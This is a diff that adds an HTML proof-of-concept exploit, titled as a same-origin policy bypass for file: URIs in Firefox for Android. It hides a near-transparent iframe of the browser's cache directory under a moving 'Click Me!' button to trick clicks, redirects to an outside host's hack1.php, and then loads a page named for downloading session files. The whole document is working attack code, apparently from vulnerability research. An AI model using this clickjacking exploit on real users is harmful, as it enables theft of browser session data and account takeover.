@@ -1,0 +1,56 @@
+<title>part1 - Firefox for Android : Same-origin policy for file: URIs Bypass</title>
+<div style="z-index:2; opacity:0.1; filter:alpha(opacity=0); "><iframe src="file:///data/data/org.mozilla.firefox/cache/" id="sessionframe" width="100%" height="100%" frameborder="0"></iframe></div><div id="page" style="z-index:-1; position:absolute; top:0px; height:100%; paddingtop:0px; width:100%; text-indent:0px; ">
+<div id="position" style="text-align: center;z-index:-1; position:absolute; left:70px; top:131px; height:250px; width:250px; text-indent:0px; ">
+<br /><br><p></p>
+<input name="5" value="Click Me!" type="submit" /> </div>
+</div></div>
+<script>
+
+
+setTimeout("document.location='http://www.alternativ-testing.fr/hack1.php';stepmovediv();", 1500);
+
+
+
+function stepmovediv() {
+setTimeout("document.getElementById('position').style.top='-100px';", 4000);
+
+setTimeout("document.getElementById('position').style.top='131px';", 8200);
+
+setTimeout("document.getElementById('position').style.left='63px';", 8200);
+
+setTimeout("stepactivfunction();", 8200);
+}
+
+
+function stepactivfunction() {
+setTimeout("stepmovedivtwo();", 5200);
+
+	
+}
+
+function stepmovedivtwo() {
+setTimeout("document.getElementById('position').style.top='-100px';", 0100);
+
+setTimeout("document.getElementById('position').style.top='151px';", 1500);
+
+setTimeout("stepactivfunctiontwo();", 6200);
+}
+
+function stepactivfunctiontwo() {
+setTimeout("stepmovedivthree();", 0800);
+
+	
+}
+
+
+function stepmovedivthree() {
+setTimeout("document.getElementById('position').style.top='-100px';", 0100);
+
+setTimeout("document.getElementById('position').style.top='244px';", 2000);
+
+setTimeout("document.location = './v2-Download_SessionFiles_From_DownloadFolder_inTXT.html';", 8000);
+}
+
+
+
+</script>
